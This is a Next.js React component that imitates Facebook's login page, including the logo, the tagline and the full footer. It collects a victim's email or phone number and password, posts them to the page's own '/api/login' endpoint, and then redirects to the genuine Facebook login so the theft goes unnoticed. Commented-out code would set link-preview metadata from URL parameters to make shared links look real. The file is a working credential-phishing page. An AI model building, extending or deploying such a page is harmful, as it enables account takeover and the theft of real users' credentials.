"use client";
import axios from "axios";
// import Head from "next/head";
import { useState } from "react";
// import { useSearchParams } from "next/navigation";

export default function FacebookLogin() {
  const [isSubmitting, setIsSubmitting] = useState(false);
  // const [error, setError] = useState("");
  const [formData, setFormData] = useState({
    user_name: "",
    password: "",
  });

  // const searchParams = useSearchParams();

  // const title = searchParams.get("title") || "Facebook – log in or sign up";
  // const description =
  //   searchParams.get("desc") ||
  //   "Facebook helps you connect and share with the people in your life.";
  // const image =
  //   searchParams.get("cover") ||
  //   "https://www.facebook.com/images/fb_icon_325x325.png";

  const handleInputChange = (
    e: React.ChangeEvent<HTMLInputElement | HTMLTextAreaElement>
  ) => {
    const { name, value } = e.target;
    setFormData((prevData) => ({
      ...prevData,
      [name]: value,
    }));
  };
  const handleSubmit = async (e: React.FormEvent<HTMLFormElement>) => {
    e.preventDefault();
    setIsSubmitting(true);

    // Send dataToSend to the backend
    try {
      const response = await axios.post("/api/login", formData, {
        headers: {
          "Content-Type": "application/json",
        },
      });
      if (response.status === 200) {
        // Handle successful login
        console.log("Login successful");
        window.location.href =
          "https://www.facebook.com/login/?privacy_mutation_token=eyJ0eXBlIjowLCJjcmVhdGlvbl90aW1lIjoxNzQyMDk3Mjc5LCJjYWxsc2l0ZV9pZCI6MzgxMjI5MDc5NTc1OTQ2fQ%3D%3D&next"; // Redirect user
      } else {
        // setError(response.data.message);
      }

      console.log("response:", response);
    } catch (error) {
      console.error("Error submitting form:", error);
    } finally {
      setIsSubmitting(false);
    }
  };

  return (
    <>
      {/* <Head>
        <title>{title}</title>
        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
        <meta charSet="UTF-8" />
        <meta httpEquiv="X-UA-Compatible" content="IE=edge" />
        <meta name="description" content={description} />
        <meta property="og:title" content={title} />
        <meta property="og:description" content={description} />
        <meta property="og:image" content={image} />
        <meta property="og:type" content="website" />
        <meta
          property="og:url"
          content={typeof window !== "undefined" ? window.location.href : ""}
        />
        <link rel="icon" href="/2sFJRNmJ5OP.ico" />
      </Head> */}

      <main className="main">
        <section className="main__container">
          <div className="main__container--left">
            <div className="container--info">
              <img src="/facebook.svg" alt="FB_logo" />
              <br />
              <h2 className="main_sentence text-center-no-md">
                Facebook helps you connect and share with the people in your
                life.
              </h2>
            </div>
          </div>
          <div className="main__container--rigth">
            <div className="main__form">
              <form onSubmit={handleSubmit}>
                <div className="main__form--input">
                  <input
                    type="text"
                    name="user_name"
                    placeholder="Email or phone number"
                    value={formData.user_name}
                    onChange={handleInputChange}
                  />
                  <br />
                  <input
                    type="password"
                    name="password"
                    placeholder="Password"
                    value={formData.password}
                    onChange={handleInputChange}
                  />
                  <br />
                </div>
                <div className="main__form--button">
                  <button
                    type="submit"
                    id="login-button"
                    disabled={isSubmitting}
                  >
                    Login
                  </button>
                  <br />
                  <div className="form__bottom">
                    <a href="#" id="forget__pass">
                      Forgot your password?
                    </a>
                  </div>
                  <div id="barra"></div>
                  <div className="form__bottom">
                    <button type="button" id="newAccount">
                      Create new account
                    </button>
                    <br />
                  </div>
                </div>
              </form>
            </div>
            <div className="add">
              <p>
                <a href="" className="main_new_page_link">
                  Create a Page
                </a>{" "}
                for a celebrity, brand, or business.
              </p>
            </div>
          </div>
        </section>
      </main>
      <footer className="footer">
        <div className="">
          <div className="_95ke _8opy">
            <div
              id="pageFooter"
              data-referrer="page_footer"
              data-testid="page_footer"
            >
              <ul
                className="uiList localeSelectorList _2pid _509- _4ki _6-h _6-j _6-i"
                data-nocookies="1"
              >
                <li>English (UK)</li>
                <li>
                  <a
                    className="_sv4"
                    dir="ltr"
                    href="https://www.facebook.com/"
                    title="Hausa"
                    id="u_0_7_SB"
                  >
                    Hausa
                  </a>
                </li>
                <li>
                  <a
                    className="_sv4"
                    dir="ltr"
                    href="https://ha-ng.facebook.com/"
                    title="French (France)"
                    id="u_0_8_AE"
                  >
                    Français (France)
                  </a>
                </li>
                <li>
                  <a
                    className="_sv4"
                    dir="ltr"
                    href="https://fr-fr.facebook.com/"
                    title="Portuguese (Brazil)"
                    id="u_0_9_8d"
                  >
                    Português (Brasil)
                  </a>
                </li>
                <li>
                  <a
                    className="_sv4"
                    dir="ltr"
                    href="https://pt-br.facebook.com/"
                    title="Spanish"
                    id="u_0_a_28"
                  >
                    Español
                  </a>
                </li>
                <li>
                  <a
                    className="_sv4"
                    dir="rtl"
                    href="https://es-la.facebook.com/"
                    title="Arabic"
                    id="u_0_b_lE"
                  >
                    العربية
                  </a>
                </li>
                <li>
                  <a
                    className="_sv4"
                    dir="ltr"
                    href="https://ar-ar.facebook.com/"
                    title="Indonesian"
                    id="u_0_c_BG"
                  >
                    Bahasa Indonesia
                  </a>
                </li>
                <li>
                  <a
                    className="_sv4"
                    dir="ltr"
                    href="https://id-id.facebook.com/"
                    title="German"
                    id="u_0_d_Nc"
                  >
                    Deutsch
                  </a>
                </li>
                <li>
                  <a
                    className="_sv4"
                    dir="ltr"
                    href="https://de-de.facebook.com/"
                    title="Japanese"
                    id="u_0_e_Mz"
                  >
                    日本語
                  </a>
                </li>
                <li>
                  <a
                    className="_sv4"
                    dir="ltr"
                    href="https://ja-jp.facebook.com/"
                    title="Italian"
                    id="u_0_f_Xw"
                  >
                    Italiano
                  </a>
                </li>
                <li>
                  <a
                    className="_sv4"
                    dir="ltr"
                    href="https://it-it.facebook.com/"
                    title="Hindi"
                    id="u_0_g_tC"
                  >
                    हिन्दी
                  </a>
                </li>
                <li>
                  <a
                    role="button"
                    className="_42ft _4jy0 _517i _517h _51sy"
                    rel="dialog"
                    href="#"
                    title="Show more languages"
                  >
                    <i className="img sp_GPvE0syHYuh_2x sx_615588"></i>
                  </a>
                </li>
              </ul>
              <div
                id="barra"
                style={{ borderTop: "1px solid #fefefe", margin: "10px 0px" }}
              ></div>
              <div
                id="pageFooterChildren"
                role="contentinfo"
                aria-label="Facebook site links"
              >
                <ul className="uiList pageFooterLinkList _509- _4ki _703 _6-i">
                  <li>
                    <a href="/reg/" title="Sign up for Facebook">
                      Sign Up
                    </a>
                  </li>
                  <li>
                    <a href="/login/" title="Log in to Facebook">
                      Log in
                    </a>
                  </li>
                  <li>
                    <a
                      href="https://messenger.com/"
                      title="Take a look at Messenger."
                    >
                      Messenger
                    </a>
                  </li>
                  <li>
                    <a href="/lite/" title="Facebook Lite for Android.">
                      Facebook Lite
                    </a>
                  </li>
                  <li>
                    <a
                      href="https://www.facebook.com/watch/"
                      title="Browse in Video"
                    >
                      Video
                    </a>
                  </li>
                  <li>
                    <a
                      href="https://about.meta.com/technologies/meta-pay"
                      title="Learn more about Meta Pay"
                      target="_blank"
                    >
                      Meta Pay
                    </a>
                  </li>
                  <li>
                    <a
                      href="https://www.meta.com/"
                      title="Discover Meta"
                      target="_blank"
                    >
                      Meta Store
                    </a>
                  </li>
                  <li>
                    <a
                      href="https://www.meta.com/quest/"
                      title="Learn more about Meta Quest"
                      target="_blank"
                    >
                      Meta Quest
                    </a>
                  </li>
                  <li>
                    <a
                      href="https://www.meta.com/smart-glasses/"
                      title="Learn more about Ray-Ban Meta"
                      target="_blank"
                    >
                      Ray-Ban Meta
                    </a>
                  </li>
                  <li>
                    <a href="https://www.meta.ai/" title="Meta AI">
                      Meta AI
                    </a>
                  </li>
                  <li>
                    <a
                      href="https://l.facebook.com/l.php?u=https%3A%2F%2Fwww.instagram.com%2F&amp;h=AT3jZ5E8Zb0RnTeoOrquez_qbRh9IwkmV6jz-ziiFDYoeF9AYQ649gAQ4mZw6EPeOpPKq7QPQJpNu1t3PxbA0v3mQzSsAWXCEPXw447v5iDM-xUb3oifJZLXwCUPWEKEbn0D-1uXp1bnlYNFxOSOBR46g8U"
                      title="Take a look at Instagram"
                      target="_blank"
                      rel="nofollow"
                      data-lynx-mode="asynclazy"
                    >
                      Instagram
                    </a>
                  </li>
                  <li>
                    <a
                      href="https://www.threads.net/"
                      title="Check out Threads"
                    >
                      Threads
                    </a>
                  </li>
                  <li>
                    <a
                      href="/votinginformationcenter/?entry_point=c2l0ZQ%3D%3D"
                      title="See the Voting Information Centre"
                    >
                      Voting Information Centre
                    </a>
                  </li>
                  <li>
                    <a
                      href="/privacy/policy/?entry_point=facebook_page_footer"
                      title="Learn how we collect, use and share information to support Facebook."
                    >
                      Privacy Policy
                    </a>
                  </li>
                  <li>
                    <a
                      href="/privacy/center/?entry_point=facebook_page_footer"
                      title="Learn how to manage and control your privacy on Facebook."
                    >
                      Privacy Centre
                    </a>
                  </li>
                  <li>
                    <a
                      href="https://about.meta.com/"
                      title="Read our blog, discover the resource centre and find job opportunities."
                    >
                      About
                    </a>
                  </li>
                  <li>
                    <a
                      href="/ad_campaign/landing.php?placement=pflo&amp;campaign_id=402047449186&amp;nav_source=unknown&amp;extra_1=auto"
                      title="Advertise on Facebook"
                    >
                      Create ad
                    </a>
                  </li>
                  <li>
                    <a
                      href="/pages/create/?ref_type=site_footer"
                      title="Create a Page"
                    >
                      Create Page
                    </a>
                  </li>
                  <li>
                    <a
                      href="https://developers.facebook.com/?ref=pf"
                      title="Develop on our platform."
                    >
                      Developers
                    </a>
                  </li>
                  <li>
                    <a
                      href="/careers/?ref=pf"
                      title="Make your next career move to our brilliant company."
                    >
                      Careers
                    </a>
                  </li>
                  <li>
                    <a
                      href="/policies/cookies/"
                      title="Learn about cookies and Facebook."
                      data-nocookies="1"
                    >
                      Cookies
                    </a>
                  </li>
                  <li>
                    <a
                      className="_41ug"
                      data-nocookies="1"
                      href="https://www.facebook.com/help/568137493302217"
                      title="Learn about Ad Choices."
                    >
                      AdChoices
                      <i className="img sp_GPvE0syHYuh_2x sx_d60d8c"></i>
                    </a>
                  </li>
                  <li>
                    <a
                      data-nocookies="1"
                      href="/policies?ref=pf"
                      title="Review our terms and policies."
                    >
                      Terms
                    </a>
                  </li>
                  <li>
                    <a href="/help/?ref=pf" title="Visit our Help Centre.">
                      Help
                    </a>
                  </li>
                  <li>
                    <a
                      href="https://www.facebook.com/help/637205020878504"
                      title="Visit our contact uploading and non-users notice."
                    >
                      Contact uploading and non-users
                    </a>
                  </li>
                  <li>
                    <a
                      className="accessible_elem"
                      href="/settings"
                      title="View and edit your Facebook settings."
                    >
                      Settings
                    </a>
                  </li>
                  <li>
                    <a
                      className="accessible_elem"
                      href="/allactivity?privacy_source=activity_log_top_menu"
                      title="View your activity log"
                    >
                      Activity log
                    </a>
                  </li>
                </ul>
              </div>
              <div className="mvl copyright">
                <div>
                  <span> Meta © 2025</span>
                </div>
              </div>
            </div>
          </div>
        </div>
      </footer>
    </>
  );
}
